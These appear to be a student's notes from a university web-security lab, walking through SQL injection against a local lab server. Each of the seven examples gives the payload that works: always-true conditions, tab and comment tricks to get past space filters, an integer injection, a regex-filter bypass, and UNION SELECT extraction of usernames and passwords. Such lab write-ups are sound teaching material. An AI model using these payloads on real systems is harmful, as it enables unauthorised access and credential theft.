# SQLi

## Example 1 - Basic SQLi

`http://172.16.219.145/sqli/example1.php?name=root`
- we already have the user query `?name=root`
### Vulnerable SQL Query

```sql
SELECT * FROM users WHERE name = '<user input>';
```

### Payload

`?name=root'OR '1'='1' %23`
- The first `'` in our payload deactivates the first `'` in the SQL Query
- `OR '1'='1'` is a condition which will **always be true**.
	- effectively bypassing authentication or filters
- `%23` decodes to `#`, everything after this is ignored
OR
`?name=root'OR '1'='1`

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413155539.png" width="600"/>

## Example 2 - ERROR NO SPACE

`http://172.16.219.145/sqli/example2.php?name=root`
- site returns `ERROR NO SPACE` when space is in URL

### Payload

`?name=root'%09OR%09'1'='1'%09%23`
- `%09` decodes to **tab**, which is an alternative to **space** (`%23`)

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413155950.png" width="600"/>

## Example 3 - PHP Comment Spaces

`http://172.16.219.145/sqli/example3.php?name=root`
- no tabs or spaces allowed
### Payload

`?name=root'/**/OR/**/'1'='1'/**/%23`

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413162045.png" width="600"/>

## Example 4 - Integers in SQLi

`http://172.16.219.145/sqli/example4.php?id=2`
- we know developer uses `mysql_real_escape_string` to try mitigate vulnerabilities
- but the query is an **integer**, not a **string**

### Payload

`?id=2 OR 1=1`

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413162722.png" width="600"/>
-- these next 2 examples are my university scope questions, they have their own objectives -- 

## Example 5 - Oldest to Youngest

`http://172.16.219.145/sqli/example5.php?id=2`

**Objective**: Inject SQL code to reveal all four users’ details sorted by 'age' from oldest at the top to youngest at the bottom.

### Payload

`?id=2 OR 1=1 ORDER BY age DESC`
- Youngest to Oldest: `?id=2 OR 1=1 ORDER BY age`

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413163318.png" width="600"/>

## Example 6 - Regex Filter Bypass

`http://172.16.219.145/sqli/example6.php?id=2`

The developer has made a mistake in the regular expression filter:
```php
if (!preg_match('/[0-9]+$/', $_GET["id"])) {   
    die("ERROR INTEGER REQUIRED");  
}
```

### Payload

`?id=2 OR 1=1 %23 5`
- `%23` decodes to `#`
- `5` is then passed through the regex filter
	- satisfying it even though we still injected SQL

## Example 7 - UNION SELECT Injection

-- University objective Example --
 - we want to extract additional data using `UNION SELECT`

1. Find column count
2. `Use UNION SELECT`
3: Extract useful data
 - usernames
 - passwords

### Payload 1

`?id=2 ORDER BY 3 --`
 - increase the number until you get an error
 - the last working number is the column count
 - 2 works but 3 errors → 2 columns

### Payload 2

`?id=2 UNION SELECT 1,2 --`
 - this confirms injection works by showing 1 or 2 in the output

### Payload 3

`?id=2 UNION SELECT username, password FROM users --`
 - replaces original results with values from the users table
- `UNION` combines results from two queries
- `SELECT username, password FROM users` retrieves data we want
- `--` comments out the rest of the original SQL to avoid syntax errors

---

Last Updated 20250414
